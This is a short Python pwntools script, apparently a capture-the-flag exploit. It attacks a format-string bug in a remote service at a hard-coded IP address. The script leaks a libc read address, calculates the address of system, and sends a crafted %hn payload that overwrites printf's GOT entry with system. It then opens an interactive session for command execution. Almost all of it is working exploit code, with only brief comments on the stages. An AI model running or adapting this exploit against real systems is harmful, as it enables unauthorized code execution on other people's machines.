printf_got = 0x601028
from pwn import *

r = remote('128.199.98.78',1800)
print (r.recv())

# ===== leaking <read+16> =====
r.sendline('4 %3$p')
leaked_read = r.recv().decode('utf-8')
leaked_read = r.recv().decode('utf-8')
leaked_read = int(leaked_read,16)

print("Leaked read:" + str(hex(leaked_read)) )
libc_system = 0x0000000000045390
libc_read = 0x00000000000f6670

target_system = leaked_read - 16 - libc_read + libc_system
print ("Target system: "+ str(hex(target_system)))

r.sendline("1")
print (r.recv())

last4sys = int(str(hex(target_system))[-4:],16)
last8sys = int(str(hex(target_system))[-8:-4],16)


if last8sys > last4sys:
    last8sys = last8sys-last4sys

    print("sending pay")
    payload = '4 %'+str(last4sys-1)+'c %17$hn %'+str(last8sys-2)+'c %15$hn'+'\x00'*11+'\x2a\x10\x60'+'\x00'*13 + '\x28\x10\x60' +'\x00'*17 
    print(payload)
    r.sendline(payload)
    r.interactive()

# """
# ==========stage 1 =========
# leak libc 
# calculate offsets by aslr and find system address
# ==========stage 2 =========
# Overwrite printf GOT with system GOT.
# ==========
# """

# This script is developed under ubuntu 16.04 Lts using environment variable LD_LIBRARY_PATH=/home/ubuntu/workingDir/
# This ensures that we are using the libc they provided to find the relevant offsets
# find offset using: $ readelf -s libc | grep system 